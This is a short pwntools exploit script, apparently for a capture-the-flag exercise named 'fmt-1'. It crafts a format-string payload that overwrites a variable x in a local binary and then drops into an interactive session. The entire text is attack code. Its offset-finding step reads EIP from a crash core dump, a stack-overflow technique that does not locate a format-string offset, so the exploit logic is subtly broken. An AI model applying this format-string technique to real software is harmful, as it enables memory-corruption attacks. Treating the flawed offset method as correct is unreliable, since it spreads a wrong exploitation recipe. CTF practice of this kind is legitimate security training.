from pwn import *
# Set up the process and context
binary_path = './pwn/string/fmt-1/fmt1'
binary = ELF(binary_path)
context.binary = binary

# Step 1: Generate a unique pattern
pattern = cyclic(100)

# Step 2: Send the pattern to the binary
p = process(binary_path)
p.sendline(pattern)
p.wait()

# Step 3: Get the core dump and find the offset
core = Coredump('./core')
offset = cyclic_find(core.eip)

# Step 4: Create the payload to overwrite the value of x with 4
x_addr = binary.symbols['x']
payload = fmtstr_payload(offset, {x_addr: 4})

# Main exploitation logic
def exploit():
    p = process(binary_path)
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
